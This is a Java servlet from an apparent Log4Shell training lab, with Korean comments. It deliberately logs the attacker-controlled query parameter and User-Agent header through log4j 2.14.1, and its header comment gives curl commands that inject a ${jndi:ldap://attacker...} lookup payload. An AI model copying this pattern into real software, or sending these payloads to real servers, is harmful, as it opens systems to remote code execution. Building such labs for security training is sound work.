package com.example;

import java.io.IOException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Log4Shell 실습용 취약 서블릿.
 * 공격자가 통제하는 입력(쿼리 파라미터 x, User-Agent 헤더)을 log4j 로 그대로 로깅한다.
 * log4j 2.14.1 에서는 메시지 lookup 이 기본 활성이라 ${jndi:...} 가 평가되어 트리거된다.
 *
 * 트리거 예:
 *   curl "http://victim-v1:8080/?x=\${jndi:ldap://attacker:1389/path}"
 *   curl -H 'User-Agent: ${jndi:ldap://attacker:1389/path}' http://victim-v1:8080/
 *
 * 로깅 레벨을 ERROR 로 둔 이유: 설정 미인식 시에도 기본 설정(ERROR/Console)으로
 * 반드시 메시지가 처리되어 lookup 이 확실히 발동하도록 하기 위함.
 */
@WebServlet(urlPatterns = {"/*"})
public class VulnServlet extends HttpServlet {

    private static final long serialVersionUID = 1L;
    private static final Logger LOG = LogManager.getLogger(VulnServlet.class);

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String x = req.getParameter("x");
        String ua = req.getHeader("User-Agent");

        // 공격자 통제 입력을 로깅 -> Log4Shell 트리거 지점
        LOG.error("victim received request x={} ua={}", x, ua);

        resp.setContentType("text/plain; charset=utf-8");
        resp.getWriter().println("log4shell lab victim: logged query param 'x' and User-Agent header");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        doGet(req, resp);
    }
}
